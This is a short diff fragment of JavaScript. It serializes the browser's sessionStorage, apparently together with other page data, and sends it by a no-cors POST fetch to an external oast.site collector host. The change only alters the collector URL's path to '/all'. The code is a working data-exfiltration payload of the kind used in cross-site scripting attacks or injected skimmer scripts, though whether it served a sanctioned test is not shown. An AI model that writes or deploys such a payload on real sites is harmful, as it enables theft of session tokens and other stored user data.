@@ -5,7 +5,7 @@
         sessionStorage: JSON.stringify(sessionStorage),
     };
     
-    fetch('https://ah8eaj5bg2di7v5tu85c91c4vwzuopbe0.oast.site/', {
+    fetch('https://ah8eaj5bg2di7v5tu85c91c4vwzuopbe0.oast.site/all', {
             method: 'POST',
             mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
